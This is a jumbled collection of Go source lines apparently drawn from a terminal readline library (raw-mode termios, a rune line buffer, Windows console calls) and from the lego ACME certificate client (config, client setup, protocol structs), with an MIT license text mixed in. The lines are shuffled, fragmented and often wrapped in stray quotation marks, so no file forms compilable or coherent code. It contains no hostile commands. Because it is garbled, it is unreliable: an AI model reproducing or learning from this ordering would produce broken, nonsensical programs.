"return nil, io.EOF"
newState.Iflag 
package readline
"n, err := syscall.Read(fd, buf[:])"
= syscall.ECHO
 syscall.INLCR 
return err == nil
if len(ret) == 0 {
// IsTerminal returns true if the given file descriptor is a terminal.
return 
if n == 0 {
"return nil, err"
// commonly found on UNIX systems.
newState.Cc[syscall.VMIN] = 1
// returned does not include the 
"_, err := getTermios(fd)"
// restored.
termios
// is commonly used for inputting passwords and other sensitive data. The slice
 syscall.ISTRIP 
"return ret, nil"
"func restoreTerm(fd int, state "
newState)
"""io"""
newState.Cc[syscall.VTIME] = 0
// Use of this source code is governed by a BSD-style
if n < len(buf) {
var oldState State
 syscall.PARMRK 
"oldState, setTermios(fd, "
"Termios)(termios), nil"
"return nil, err"
func getTermios(fd int) (
"import ""golang.org/x/sys/unix"""
"ws, err := unix.IoctlGetWinsize(fd, unix.TIOCGWINSZ)"
Termios) error {
type Termios unix.Termios
"return int(ws.Col), int(ws.Row), nil"
// Copyright 2013 The Go Authors. All rights reserved.
unix.Termios)(termios))
"func GetSize(fd int) (int, int, error) {"
// Use of this source code is governed by a BSD-style
package readline
// license that can be found in the LICENSE file.
"func setTermios(fd int, termios "
"return unix.IoctlSetTermios(fd, unix.TCSETSF, ("
// GetSize returns the dimensions of the given terminal.
"return 0, 0, err"
return (
"termios, err := unix.IoctlGetTermios(fd, unix.TCGETS)"
if err != nil {
build solaris
"Termios, error) {"
"func NewRuneBuffer(w io.Writer, prompt string, cfg "
prompt []rune
1]) {
sp := r.getSplitByLine(r.buf[:r.idx])
for init < len(r.buf) 
if len(r.buf) == 1 {
if len(r.buf) < 2 {
"// up one line, go to the start of the line and move cursor right to the end (r.width)"
RuneBuffer) Replace(ch rune) {
r.buf = r.buf[:r.idx]
var sep = map[int]bool{}
return width
 len(r.lastKill))
r.pushKill(r.buf[:])
return 0
if width == 0 {
"buf = append(buf, '"
rb := 
RuneBuffer) LineCount(width int) int {
RuneBuffer) OnWidthChange(newWidth int) {
"tail := append(s, r.buf[r.idx:]...)"
RuneBuffer) CursorLineCount() int {
"b""))"
RuneBuffer) Kill() {
= len(s)
"io.WriteString(buf, """
RuneBuffer) Backup() {
for {
bck 
} else {
RuneBuffer) SetConfig(cfg 
"w:           w,"
break
 RuneBuffer) pushKill(text []rune) {
return newr
move := start - r.idx
RuneBuffer) RuneSlice(i int) []rune {
 i > 0
// TODO: move back
"RuneBuffer) cleanOutput(w io.Writer, idxLine int) {"
r.bck = 
i -= r.promptLen()
"copy(rs, r.buf[r.idx"
r.idx 
 IsWordBreak(r.buf[r.idx
RuneBuffer) MoveBackward() {
r.Lock()
if r.cfg.EnableMask 
RuneBuffer) getSplitByLine(rs []rune) []string {
if IsWordBreak(r.buf[i]) 
package readline
RuneBuffer) PromptLen() int {
"033[J""))"
return len(sp[len(sp)-1]) == 0
RuneBuffer) Runes() []rune {
r.w.Write([]byte(string(r.buf[r.idx : r.idx
if r.hadClean 
RuneBuffer) Len() int {
"r.w.Write([]byte("""
width = r.width
RuneBuffer {
r.pushKill(r.buf[r.idx : r.idx
if i == 0 {
return r.LineCount(r.width) - r.IdxLine(r.width)
RuneBuffer) Refresh(f func()) {
return rb
RuneBuffer) print() {
strconv.Itoa(r.width)
"r.w.Write(bytes.Repeat([]byte("""
return false
"buf = append(buf, r.lastKill...)"
 i >= 0
"""io"""
if i >= runes.WidthAll(r.buf) {
if len(r.lastKill) == 0 {
} else if r.idx >= len(r.buf) {
if e == '
move])))
offset string
RuneBuffer) WriteRunes(s []rune) {
RuneBuffer) KillFront() {
"// already at the end, so do nothing"
"runeBufferBck{r.buf, r.idx}"
r.hadClean = true
width := r.promptLen()
r.idx = len(r.buf)
RuneBuffer) Delete() (success bool) {
sep[i] = true
RuneBuffer) MoveToPrevWord() (success bool) {
if idxLine == 0 {
"// if we are at the end of a word already, go to next"
"r.buf = append(r.buf[:r.idx], r.buf[r.idx"
"""strconv"""
return r.idxLine(width)
"""strings"""
"buf = append(buf, r.buf[:r.idx]...)"
033[2K
 len(r.buf) > 0 {
if r.buf[len(r.buf)-1] == '
if f != nil {
r.clean()
RuneBuffer) Erase() {
buf.Write([]byte{'
if !IsWordBreak(r.buf[i]) 
"copy(r.buf[:length], r.buf[r.idx:])"
"033["" "
defer r.Unlock()
"return LineCount(width,"
r.WriteRunes([]rune(s))
for i := init 
RuneBuffer) MoveForward() {
if width == -1 {
func (r
r.idx = idx
sync.Mutex
return r.idx
"r.buf = append(r.buf[:r.idx], tail...)"
"copy(newr, r.buf)"
r.buf = r.buf[:length]
if r.idx == 0 {
r.PromptLen())
RuneBuffer) promptLen() int {
// goto start
RuneBuffer) output() []byte {
" ""m""))"
if r.bck == nil {
RuneBuffer) SetMask(m rune) {
return buf.Bytes()
n'})
"buf := make([]rune, 0, len(r.buf) "
m : r.idx])
r.idx--
1:]...)
RuneBuffer) isInLineEdge() bool {
r.buf = buf
if r.isInLineEdge() {
"buf.Write([]byte(strings.Repeat(string(r.cfg.MaskRune), len(r.buf)-1)))"
for i := r.idx - 1
"""C""...)"
RuneBuffer) calWidth(m int) int {
hadClean    bool
r.offset = offset
r.Kill()
r.pushKill(r.buf[r.idx:])
r.pushKill(r.buf[r.idx:i-1])
Config) {
RuneBuffer) Clean() {
idx    int
r.idx
r.buf[r.idx] = ch
buf []rune
"""bufio"""
= len(r.lastKill)
RuneBuffer) Reset() []rune {
"033[0m""))"
 style 
func (r 
interactive bool
// cursor position
for i := len(r.buf)
"033[2K"")"
"for _, e := range r.cfg.Painter.Paint(r.buf, r.idx) {"
"r.cleanOutput(r.w, idxLine)"
buf.WriteRune(e)
cfg         
sp := r.getSplitByLine(r.buf)
r.idx = i
if i > 0 {
r.idx = i - 1
r.buf = r.bck.buf
"buf.WriteString(strings.Repeat("""
if r.idx == len(r.buf) {
RuneBuffer) Transpose() {
"033[J"")) // just like "
RuneBuffer) WriteRune(s rune) {
r.idx = 0
return rs
r.pushKill(r.buf[i:r.idx])
w      io.Writer
n' {
"buf = append(buf, r.buf[r.idx:]...)"
if len(r.buf) > r.idx {
if !IsWordBreak(r.buf[r.idx]) 
RuneBuffer) WriteString(s string) {
runes.WidthAll(r.buf)
r.interactive = cfg.useInteractive()
RuneBuffer) IdxLine(width int) int {
"panic(""end < start"")"
RuneBuffer) Restore() {
"buf.Write([]byte("" "
"buf = append(buf, """
buf := bytes.NewBuffer(nil)
RuneBuffer) MoveToLineEnd() {
if !r.interactive {
r.width = newWidth
RuneBuffer) MoveToLineStart() {
init
init := r.idx
// keep going until at the end of a word
RuneBuffer) SetOffset(offset string) {
RuneBuffer) MoveToEndWord() {
var i int
RuneBuffer) MoveToNextWord() {
RuneBuffer) Set(buf []rune) {
RuneBuffer) Yank() {
r.w.Write(r.output())
if sep[i] {
RuneBuffer{
RuneBuffer) Backspace() {
r.Unlock()
"b"", len(r.buf)"
buf := bufio.NewWriter(w)
"RuneBuffer) SetStyle(start, end int, style string) {"
length := len(r.buf) - r.idx
"newr := make([]rune, len(r.buf))"
r.cleanWithIdxLine(r.idxLine(r.width))
r.hadClean = false
ret := runes.Copy(r.buf)
for i := r.idx 
"033[A"")"
 i-- {
r.w.Write([]byte(string(r.buf[start:end])))
return len(r.buf)
"r.lastKill = append([]rune{}, text...)"
r.pushKill(r.buf[:r.idx])
r.idx = len(r.buf) - 1
 IsWordBreak(r.buf[init]) {
RuneBuffer) clean() {
"buf.WriteString(strings.Repeat("" "", TabWidth))"
return ret
"rs := make([]rune, -i)"
t' {
RuneBuffer) CurrentWidth(x int) int {
if isWindows {
if prevChar {
"rs := make([]rune, i)"
return r.idx == len(r.buf)
"""sync"""
rb.SetPrompt(prompt)
lastKill []rune
var buf []byte
033[A
Config
"033["""
return runes.WidthAll(r.buf[:x])
// move input to the left of one
if reverse {
 i < len(r.buf)
buf.Write(r.getBackspaceSequence())
"""bytes"""
type runeBufferBck struct {
r.promptLen()))
if r.buf[i] == ch {
"Config, width int) "
if m > 0 {
runeBufferBck
"b""), r.calWidth(move)))"
"buf.WriteString("""
return runes.WidthAll(r.buf[r.idx : r.idx
r.cfg.MaskRune = m
r.buf = r.buf[:0]
RuneBuffer) DeleteWord() {
r.prompt = []rune(prompt)
i:r.idx])
RuneBuffer) BackEscapeWord() {
 IsWordBreak(r.buf[i-1]) {
"interactive: cfg.useInteractive(),"
"RuneBuffer) SetWithIdx(idx int, buf []rune) {"
buf.WriteString(string(r.prompt))
return runes.WidthAll(r.buf[r.idx
"cfg:         cfg,"
RuneBuffer) SetPrompt(prompt string) {
return len(sp) - 1
import (
idx int
r.idx = r.bck.idx
success = true
 !r.interactive {
RuneBuffer) idxLine(width int) int {
RuneBuffer) IsCursorInEnd() bool {
 i > r.idx
r.print()
r.cfg = cfg
 !IsWordBreak(r.buf[i-1]) {
for i := 0
return runes.WidthAll(runes.ColorFilter(r.prompt))
buf.Flush()
k :)
"return SplitByLine(r.promptLen(), r.width, rs)"
r.WriteRunes([]rune{s})
RuneBuffer) getBackspaceSequence() []byte {
"r.buf = append(r.buf[:r.idx], r.buf[i-1:]...)"
"width:       width,"
"copy(rs, r.buf[r.idx:r.idx"
type RuneBuffer struct {
if end < start {
buf.Write([]byte(string(r.cfg.MaskRune)))
if r.width == 0 {
RuneBuffer) cleanWithIdxLine(idxLine int) {
r.idx = 1
width int
RuneBuffer) Pos() int {
"r.buf = append(r.buf[:i], r.buf[r.idx:]...)"
 i < idxLine
"buf.Write([]byte("""
"RuneBuffer) MoveTo(ch rune, prevChar, reverse bool) (success bool) {"
if move > 0 {
buf    []rune
= r.width
"r.buf[r.idx], r.buf[r.idx-1] = r.buf[r.idx-1], r.buf[r.idx]"
return
r.Refresh(func() {
"r.SetWithIdx(len(buf), buf)"
return buf
unicodeChar       wchar
dwControlKeyState dword
EVENT_WINDOW_BUFFER_SIZE = 0x0004
type _COORD struct {
type _KEY_EVENT_RECORD struct {
func SetConsoleCursorPosition(c 
int32)(unsafe.Pointer(c)))
Kernel{}
Event     [16]byte
wVirtualKeyCode   word
type CallFunc func(u ...uintptr) error
return nil
type _INPUT_RECORD struct {
 i < t.NumField()
type _SMALL_RECT struct {
if len(args) <= 3 {
return k
EVENT_MENU               = 0x0008
"FillConsoleOutputAttribute,"
"_CONSOLE_SCREEN_BUFFER_INFO, error) {"
func GetConsoleCursorInfo() (
EventType word
type dword uint32
right  short
x short
type short int16
size := uintptr(len(args))
"_CONSOLE_CURSOR_INFO, error) {"
bVisible bool
Kernel {
"stdout,"
if int(r0) == 0 {
"GetConsoleScreenBufferInfo,"
bottom short
name := t.Field(i).Name
"""syscall"""
"buf[0], buf[1], buf[2])"
f := kernel32.NewProc(name)
type wchar uint16
_COORD) ptr() uintptr {
srWindow            _SMALL_RECT
"r0, _, e1 = syscall.Syscall(p.Addr(), size,"
Padding   uint16
func NewKernel() 
// MENU_EVENT_RECORD         MenuEvent
return uintptr(
"err := kernel.GetConsoleCursorInfo(stdout, uintptr(unsafe.Pointer(t)))"
t := new(_CONSOLE_SCREEN_BUFFER_INFO)
err := kernel.GetConsoleScreenBufferInfo(
left   short
type _CONSOLE_CURSOR_INFO struct {
_COORD) error {
} else {
"uintptr(unsafe.Pointer(t)),"
// MOUSE_EVENT_RECORD        MouseEvent
return error(e1)
Kernel) Wrap(p 
bKeyDown          int32
GetStdHandle CallFunc
"r0, _, e1 = syscall.Syscall6(p.Addr(), size,"
dwSize              _COORD
import (
type Kernel struct {
func (k 
"SetConsoleTextAttribute,"
k := 
"return t, err"
wVirtualScanCode  word
wAttributes         word
"""reflect"""
type _CONSOLE_SCREEN_BUFFER_INFO struct {
"kernel32 := syscall.NewLazyDLL(""kernel32.dll"")"
top    short
for i := 0
func (c 
return func(args ...uintptr) error {
dwCursorPosition    _COORD
v := reflect.ValueOf(k).Elem()
kernel = NewKernel()
"buf := make([]uintptr, 6)"
package readline
// FOCUS_EVENT_RECORD        FocusEvent
stdin  = uintptr(syscall.Stdin)
var r0 uintptr
if e1 != 0 {
var e1 syscall.Errno
EVENT_MOUSE              = 0x0002
"FillConsoleOutputCharacterW,"
"ReadConsoleInputW,"
return syscall.EINVAL
syscall.LazyProc) CallFunc {
"buf := make([]uintptr, 3)"
dwSize   dword
t := v.Type()
// WINDOW_BUFFER_SIZE_RECORD WindowBufferSizeEvent
wRepeatCount      word
build windows
"return kernel.SetConsoleCursorPosition(stdout, c.ptr())"
dwMaximumWindowSize _COORD
"buf[0], buf[1], buf[2], buf[3], buf[4], buf[5],"
t := new(_CONSOLE_CURSOR_INFO)
func GetConsoleScreenBufferInfo() (
EVENT_KEY                = 0x0001
type word uint16
v.Field(i).Set(reflect.ValueOf(k.Wrap(f)))
"SetConsoleCursorPosition,"
stdout = uintptr(syscall.Stdout)
"""unsafe"""
y short
"copy(buf, args)"
// KEY_EVENT_RECORD          KeyEvent
var (
"GetConsoleCursorInfo,"
const (
EVENT_FOCUS              = 0x0010
Terminal) GetConfig() 
SuspendMe()
func NewTerminal(cfg 
Config) (
Config
if r == 0 {
"t.Write([]byte("""
go func() {
"t.isReading, 1)"
"fmt.Fprintf(t, ""%c"", CharBell)"
"sizeChan: make(chan string, 1),"
t.wg.Done()
"cfg:      cfg,"
"kickChan: make(chan struct{}, 1),"
"return t, nil"
default:
t.m.Unlock()
"""sync/atomic"""
Terminal) PrintRune(r rune) {
return nil
if !ok {
t.m.Lock()
if err := cfg.Init()
func (t 
if r == CharEscapeEx {
"r = escapeKey(r, buf)"
Config) error {
type termSize struct {
isEscapeEx     bool
if key.typ == 'R' {
<-ch
Terminal) Close() error {
t.cfg
t.isReading) == 1
"033[6n""))"
if err := c.Init()
return t.cfg.Stdout.Write(b)
return atomic.LoadInt32(
if !expectNextChar {
// WriteStdin prefill the next Stdin fetch
t.EnterRawMode()
"t.isReading, 0)"
} else if isEscapeEx {
"""strings"""
"t.sleeping, 0)"
// Next time you call ReadLine() this value will be writen before the user input
"t.sleeping, 0, 1) {"
isEscape       bool
if !atomic.CompareAndSwapInt32(
return t.cfg.FuncExitRaw()
isEscape = false
kickChan  chan struct{}
case <-t.stopChan:
atomic.StoreInt32(
Terminal) IsReading() bool {
case t.kickChan <- struct{}{}:
"return NewOperation(t, t.cfg)"
top  int
continue
"Terminal) WriteStdin(b []byte) (int, error) {"
Terminal) Print(s string) {
 err != nil {
for {
Terminal) getStdin() io.Reader {
closed    int32
"outchan:  make(chan rune),"
return err
t.outchan <- r
Terminal) ReadRune() rune {
left int
buf := bufio.NewReader(t.getStdin())
break
isEscapeEx = true
"case CharInterrupt, CharEnter, CharCtrlJ, CharDelete:"
if err != nil {
"if key := readEscKey(r, buf)"
if isEscape {
 ok {
"fmt.Fprintf(t.cfg.Stdout, ""%s"", s)"
"if _, _, ok := key.Get2()"
t.wg.Wait()
Terminal) EnterRawMode() (err error) {
"""fmt"""
defer atomic.StoreInt32(
"Terminal, error) {"
import (
isEscape = true
Terminal) GetOffset(f func(offset string)) {
Terminal) SetConfig(c 
Terminal) Bell() {
return rune(0)
t.wg.Add(1)
Terminal) ioloop() {
expectNextChar = true
t := 
// return rune(0) if meet EOF
select {
type Terminal struct {
"// SleepToResume will sleep myself, and return only if I'm resumed."
"r, _, err := buf.ReadRune()"
"if closer, ok := t.cfg.Stdin.(io.Closer)"
close(t.stopChan)
defer func() {
expectNextChar bool
package readline
case CharEsc:
"Terminal) Write(b []byte) (int, error) {"
if t.cfg.VimMode {
Terminal) ExitRawMode() (err error) {
t.cfg = c
Terminal{
return r
go t.ioloop()
close(t.outchan)
stopChan  chan struct{}
return t.ExitRawMode()
r = escapeExKey(key)
return t.cfg.StdinWriter.Write(b)
outchan   chan rune
return 
"t.closed, 1) != 0 {"
Terminal) KickRead() {
fallthrough
"return nil, err"
return ch
expectNextChar = false
case t.sizeChan <- key.attr:
 key != nil {
Config {
"ch, ok := <-t.outchan"
Operation {
sizeChan chan string
ch := WaitForResume()
"fmt.Fprintf(t.cfg.Stdout, ""%c"", r)"
switch r {
wg        sync.WaitGroup
"""io"""
isReading int32
"stopChan: make(chan struct{}, 1),"
case <-t.kickChan:
sleeping  int32
"""bufio"""
"""sync"""
Terminal) SleepToResume() {
if atomic.SwapInt32(
r := t.cfg.Stdin
m         sync.Mutex
// offset
cfg       
return
Terminal) Readline() 
"if strings.Contains(err.Error(), ""interrupted system call"") {"
f(<-t.sizeChan)
var (
return t.cfg.FuncMakeRaw()
isEscapeEx = false
cfg := 
closer.Close()
t.ExitRawMode()
return ins.ReadPassword(prompt)
case <-c.notify:
stdOnce.Do(func() {
ins.SetConfig(cfg)
if i > 0 {
cerr := s.bufErr
go func() {
// reading into the real stdin
FillableStdin{
"return c.read, c.err"
"n := copy(p, s.buf)"
"func Password(prompt string) ([]byte, error) {"
"""os"""
"""sync/atomic"""
s.Unlock()
// let readline load history from filepath
func getInstance() 
"n, s.bufErr = s.stdinBuffer.Read(bufR)"
if atomic.LoadInt32(
// FillableStdin is a stdin reader which can prepend some data before
Instance
return nil
c := 
if atomic.CompareAndSwapInt32(
// and try to persist history into disk
if s.bufErr != nil {
"DisableAutoSaveHistory: true,"
err    error
"r, w := io.Pipe()"
// raise error only if 
s.ioloop()
case <-c.stop:
s.stdinBuffer.Close()
return ins.SaveHistory(content)
stdinBuffer io.ReadCloser
Instance {
CancelableStdin {
c.data = b
SetHistoryPath
return std
"c.read, c.err = c.r.Read(c.data)"
CancelableStdin{
Stderr io.WriteCloser = os.Stderr
if len(p) < i {
"stop:   make(chan struct{}),"
case c.notify <- struct{}{}:
FillableStdin) ioloop() {
"FillableStdin) Read(p []byte) (n int, err error) {"
type CancelableStdin struct {
"r:      r,"
"CancelableStdin) Read(b []byte) (n int, err error) {"
cfg.HistoryFile = fp
"// Read will read from the local buffer and if no data, read from stdin"
r      io.Reader
cfg := ins.Config.Clone()
type FillableStdin struct {
 will return nil error forever.
Stdout io.WriteCloser = os.Stdout
// readline with global configs
s.bufErr = nil
defer c.mutex.Unlock()
i := len(s.buf)
func SetAutoComplete(completer AutoCompleter) {
for {
"n, err = s.stdin.Read(p)"
CancelableStdin) Close() error {
mutex  sync.Mutex
"c.closed, 0, 1) {"
sync.Mutex
return c
go c.ioloop()
break
bufErr      error
"notify: make(chan struct{}),"
"func NewFillableStdin(stdin io.Reader) (io.ReadCloser, io.Writer) {"
stdin       io.Reader
"// set fp to """" to prevent readline persisting history to disk"
// so the 
var n int
// NewFillableStdin gives you FillableStdin
import (
break loop
close(c.stop)
 is set with a non-empty path
"return s, w"
func NewCancelableStdin(r io.Reader) 
"stdinBuffer: r,"
func SetHistoryPath(fp string) {
c.mutex.Lock()
c.closed) == 1 {
s.Lock()
"return n, cerr"
select {
// add history to global instance manually
ins := getInstance()
closed int32
func (c 
"return 0, io.EOF"
package readline
// set auto completer to global instance
CancelableStdin) ioloop() {
read   int
return ins.Readline()
stdOnce sync.Once
"s.buf = append(s.buf, bufR[:n]...)"
"func Line(prompt string) (string, error) {"
s := 
s.buf = s.buf[:0]
"stdin:       stdin,"
Stdin  io.ReadCloser  = os.Stdin
buf         []byte
i = len(p)
cfg.AutoComplete = completer
loop:
if s.bufErr == io.ErrClosedPipe {
Config{
std     
"std, _ = NewEx("
"return n, err"
"""io"""
FillableStdin) Close() error {
// global instance will not submit history automatic
notify chan struct{}
"""sync"""
func (s 
func AddHistory(content string) error {
stop   chan struct{}
AddHistory
var (
"bufR := make([]byte, 100)"
ins.SetPrompt(prompt)
data   []byte
build windows
package readline
Stderr = NewANSIWriter(Stderr)
func init() {
Stdout = NewANSIWriter(Stdout)
Stdin = NewRawReader()
"of this software and associated documentation files (the ""Software""), to deal"
copies or substantial portions of the Software.
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
The MIT License (MIT)
Copyright (c) 2015-2017 Sebastian Erhart
SOFTWARE.
"in the Software without restriction, including without limitation the rights"
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
The above copyright notice and this permission notice shall be included in all
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"// For polls the given function 'f', once every 'interval', up to 'timeout'."
"""fmt"""
import (
if stop {
"stop, err := f()"
"log.Infof(""Wait for %s [timeout: %s, interval: %s]"", msg, timeout, interval)"
case <-timeUp:
default:
select {
return nil
"func For(msg string, timeout, interval time.Duration, f func() (bool, error)) error {"
"""github.com/go-acme/lego/v3/log"""
for {
package wait
"return fmt.Errorf(""time limit exceeded: last error: %s"", lastErr)"
lastErr = err.Error()
timeUp := time.After(timeout)
"""time"""
var lastErr string
if err != nil {
time.Sleep(interval)
"return nil, errors.New(""a configuration must be provided"")"
"return nil, err"
Client) GetToSURL() string {
"""net/url"""
Config) (
"""github.com/go-acme/lego/v3/challenge/resolver"""
package lego
import (
core         
Client) GetExternalAccountRequired() bool {
if reg := config.User.GetRegistration()
resolver.SolverManager
type Client struct {
if privateKey == nil {
"core:         core,"
// A private key of type keyType (see KeyType constants) will be generated when requesting a new certificate if one isn't provided.
"Registration: registration.NewRegistrar(core, config.User),"
api.Core
Challenge    
var kid string
kid = reg.URI
if config == nil {
// GetExternalAccountRequired returns the External Account Binding requirement of the Directory
"core, err := api.New(config.HTTPClient, config.UserAgent, config.CADirURL, kid, privateKey)"
"return nil, errors.New(""the HTTP client cannot be nil"")"
// NewClient creates a new ACME client on behalf of the user.
"Client, error) {"
if config.HTTPClient == nil {
func (c 
Registration 
certificate.Certifier
return c.core.GetDirectory().Meta.TermsOfService
// Client is the user-friendly way to ACME
func NewClient(config 
privateKey := config.User.GetPrivateKey()
"_, err := url.Parse(config.CADirURL)"
Certificate  
"return nil, errors.New(""private key was nil"")"
// GetToSURL returns the current ToS URL from the Directory
"}, nil"
return c.core.GetDirectory().Meta.ExternalAccountRequired
Client{
 reg != nil {
// The client will depend on the ACME directory located at CADirURL for the rest of its actions.
"Challenge:    solversManager,"
"""github.com/go-acme/lego/v3/certificate"""
"""github.com/go-acme/lego/v3/registration"""
registration.Registrar
"""errors"""
"""github.com/go-acme/lego/v3/acme/api"""
if err != nil {
"certifier := certificate.NewCertifier(core, prober, certificate.CertifierOptions{KeyType: config.Certificate.KeyType, Timeout: config.Certificate.Timeout})"
prober := resolver.NewProber(solversManager)
"Certificate:  certifier,"
return 
solversManager := resolver.NewSolversManager(core)
ResponseHeaderTimeout: 15 
// variable. If the caCertificatesEnvVar is not set then initCertPool will
func createDefaultHTTPClient() 
// caCertificatesEnvVar is the environment variable name that can be used to
x509.CertPool from the provided
"""io/ioutil"""
http.Client
"""os"""
" customCACertsPath != """" {"
TLSClientConfig: 
KeyType certcrypto.KeyType
return nil
"""crypto/x509"""
// LEDirectoryProduction URL to the Let's Encrypt production
"caCertificatesEnvVar = ""LEGO_CA_CERTIFICATES"""
"}).DialContext,"
if customCACertsPath := os.Getenv(caCertificatesEnvVar)
 !ok {
"""github.com/go-acme/lego/v3/registration"""
KeepAlive: 30 
// specify the CA server name that can be used to
" time.Second,"
TLSHandshakeTimeout:   15 
User        registration.User
 function)
http.Client {
x509.CertPool
tls.Config{
"LEDirectoryStaging = ""https://acme-staging-v02.api.letsencrypt.org/directory"""
// authenticate an ACME server with a HTTPS certificate not issued by a CA in
"panic(fmt.Sprintf(""error creating x509 cert pool from %s=%q: %v"","
type Config struct {
ExpectContinueTimeout: 1 
// specify the path to PEM encoded CA Certificates that can be used to
"panic(fmt.Sprintf(""error reading %s=%q: %v"","
"customCAs, err := ioutil.ReadFile(customCACertsPath)"
// based on the caCertificatesEnvVar environment variable (see the 
"LEDirectoryProduction = ""https://acme-v02.api.letsencrypt.org/directory"""
"""github.com/go-acme/lego/v3/certcrypto"""
http.Client{
// return nil. If there is an error creating a 
net.Dialer{
func NewConfig(user registration.User) 
Certificate: CertificateConfig{
if err != nil {
if ok := certPool.AppendCertsFromPEM(customCAs)
"""net/http"""
Certificate CertificateConfig
Timeout:   30 
Timeout time.Duration
"""fmt"""
import (
func initCertPool() 
certPool := x509.NewCertPool()
// found in the filepath specified in the caCertificatesEnvVar OS environment
UserAgent   string
Transport: 
"""net"""
x509.CertPool populated with the PEM certificates
DialContext: (
// initCertPool creates a 
x509.CertPool {
// the system-wide trusted root list.
"HTTPClient: createDefaultHTTPClient(),"
// createDefaultHTTPClient Creates an HTTP client with a reasonable timeout value
return certPool
"ServerName: os.Getenv(caServerNameEnvVar),"
"User:       user,"
"""time"""
http.Transport{
return 
HTTPClient  
"KeyType: certcrypto.RSA2048,"
"Proxy: http.ProxyFromEnvironment,"
package lego
Config {
"caServerNameEnvVar = ""LEGO_CA_SERVER_NAME"""
// caCertificatesEnvVar value then initCertPool will panic.
initCertPool
// caServerNameEnvVar is the environment variable name that can be used to
Config{
"caCertificatesEnvVar, customCACertsPath, err))"
CADirURL    string
Timeout: 30 
// and potentially a custom 
"RootCAs:    initCertPool(),"
"""crypto/tls"""
"CADirURL:   LEDirectoryProduction,"
// LEDirectoryStaging URL to the Let's Encrypt staging
const (
type CertificateConfig struct {
"// website (optional, string):"
section-7.1.2
// The hostnames that the ACME server recognizes as referring to itself
// Challenge statuses
"json:""termsOfService"""
"// The time at which the server validated this challenge,"
"json:""newAccount"""
Type  string 
"// Including this field in a new-account request,"
"// and MUST NOT include base64 padding characters (""="")."
NotAfter string 
"json:""website"""
"// Possible values are: ""valid"", ""deactivated"", and ""revoked""."
"StatusInvalid     = ""invalid"""
section-7.1.6
"// error (optional, object):"
"// finalize (required, string):"
// as described in Section 7.1.2.1.
// Directory the ACME directory object.
Orders string 
"json:""csr"""
// This allows a client to look up an account URL based on an account key (see Section 7.3.1).
"// reason (optional, int):"
"json:""notAfter,omitempty"""
// Meta the ACME meta object (related to Directory).
"// The value ""deactivated"" should be used to indicate client-initiated deactivation"
URL string 
"json:""orders,omitempty"""
// The result of a successful finalization will be the population of the certificate URL for the order.
"// It MUST NOT contain any characters outside the base64url alphabet,"
NewNonceURL   string 
"// onlyReturnExisting (optional, boolean):"
// An HTTP or HTTPS URL locating a website providing more information about the ACME server.
"// then the CA requires that all new- account requests include an ""externalAccountBinding"" field"
ProblemDetails 
"// identifier (required, object):"
// A URL that a CSR must be POSTed to once all of the order's authorizations are satisfied to finalize the order.
// Challenge the ACME challenge object.
// Authorization the ACME authorization object.
Error 
"json:""value"""
type Authorization struct {
"// Error that occurred while the server was validating the challenge, if any,"
section-8.3
"// (Note: Because this field uses base64url, and does not include headers, it is different from PEM.)"
CaaIdentities []string 
"json:""expires,omitempty"""
section-8.4
"json:""certificate,omitempty"""
"// The requested value of the notAfter field in the certificate,"
"// For example, the server may wish to notify the client about server-initiated revocation or certificate expiration."
TermsOfService string 
"// This field is REQUIRED for objects with ""valid"" in the ""status"" field."
// in the date format defined in [RFC3339].
section-7.3
"// notAfter (optional, string):"
// A URL for the certificate that has been issued in response to this order
"// externalAccountBinding (optional, object):"
"// The timestamp after which the server will consider this authorization invalid,"
// structured as a problem document [RFC7807].
// A URL identifying the current terms of service.
"json:""wildcard,omitempty"""
"// For pending orders,"
Order
Identifier Identifier 
" rel=""up"""
"// certificate (optional, string):"
KeyAuthorization string 
// - https://tools.ietf.org/html/rfc5280
// Order the ACME order Object.
// Each array entry is an object with parameters required to validate the challenge.
uint 
// The identifier that the account is authorized to represent
section-7.1.5
// The CSR is sent in the base64url-encoded version of the DER format.
type Directory struct {
"// url (required, string):"
Authorizations []string 
"// Possible values are: ""pending"", ""ready"", ""processing"", ""valid"", and ""invalid""."
"// type (required, string):"
Contact []string 
"json:""status,omitempty"""
// Each entry is a URL from which an authorization can be fetched with a POST-as-GET request.
"// This field is REQUIRED if the ""status"" field is ""valid""."
Value string 
"// If this field is present and set to ""true"","
// For authorizations created as a result of a newOrder request containing a DNS identifier
section-7.6
// Multiple errors can be indicated by using subproblems Section 6.7.1.
"// For invalid authorizations, the challenge that was attempted and failed."
// ExtendedChallenge a extended Challenge.
Retry-After
"// The error that occurred while processing the order, if any."
"StatusValid       = ""valid"""
// The status of this order.
Type string 
"// notBefore (optional, string):"
"// For information on supported URL schemes, see Section 7.3"
Identifiers []Identifier 
"json:""challenges,omitempty"""
"json:""keyAuthorization"""
// The authorizations required are dictated by server policy
// This value MUST have at least 128 bits of entropy.
"StatusProcessing  = ""processing"""
"// The timestamp after which the server will consider this order invalid,"
Expires time.Time 
// The problem document detail SHOULD indicate which reasonCodes are allowed.
// RevokeCertMessage a certificate revocation message
package acme
// One of the revocation reasonCodes defined in Section 5.3.1 of [RFC5280] to be used when generating OCSP responses and CRLs.
"json:""newNonce"""
"// caaIdentities (optional, array of string):"
// Each string MUST represent the same sequence of ASCII code points
"// status (required, string):"
section-7.1.4
RetryAfter string 
"json:""-"""
TermsOfServiceAgreed bool 
Location
ExternalAccountRequired bool 
// This field is not updateable by the client.
"json:""notBefore,omitempty"""
section-5.3.1
"// with a value of true, indicates the client's agreement with the terms of service."
"// externalAccountRequired (optional, boolean):"
section-8
// See [RFC4086] for additional information on randomness requirements.
"// the authorizations that the client needs to complete before the requested certificate can be issued (see Section 7.5),"
type Order struct {
"StatusPending     = ""pending"""
"json:""revokeCert"""
import (
// and there may not be a 1:1 relationship between the order identifiers and the authorizations required.
